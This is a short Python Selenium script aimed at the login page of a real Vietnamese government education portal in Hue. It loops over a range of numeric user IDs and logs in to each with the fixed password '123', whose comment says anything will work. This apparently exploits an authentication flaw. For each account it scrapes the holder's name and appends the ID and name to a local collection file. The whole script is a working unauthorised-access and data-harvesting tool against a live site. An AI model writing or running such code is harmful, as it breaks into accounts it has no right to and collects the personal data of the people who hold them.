from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from extension import logger, read_env

config = read_env()

def login(inp_uid):
    uid = driver.find_element(By.ID, "txtUser")
    uid.send_keys(inp_uid)
    passwd = driver.find_element(By.ID, "txtPass")
    passwd.send_keys("123") # [CONFIG] Anything will work...
    login_btn = driver.find_element(By.ID, "btnDangNhap")
    login_btn.send_keys(Keys.ENTER)
def logout(): driver.find_element(By.ID, "LinkButton2").click()

chrome_options = Options()
chrome_options.add_argument("--disable-logging")
chrome_options.add_argument("--log-level=3") 
chrome_options.add_argument("--disable-extension")
chrome_options.add_argument("--disable-in-process-stack-traces")
driver = webdriver.Chrome(options=chrome_options)
driver.get("https://qlttgddt.hue.gov.vn/home/dangnhap.aspx")
file_name = open("./collected/ctt/UIDs and names.txt", "a", encoding="utf-8")

for user_id in range(config["start_UIDs"], config["end_UIDs"]):
    login(user_id)
    name = driver.find_element(By.XPATH,"//span[@id='lblTenTaiKhoan']/span").get_attribute('innerHTML')
    
    if name:
        file_name.write(str(user_id) + " - " + name + "\n")
        logger(True, user_id, name)
    else:
        file_name.write(str(user_id) + " - null\n")
        logger(False, user_id, name)
    logout()
file_name.close()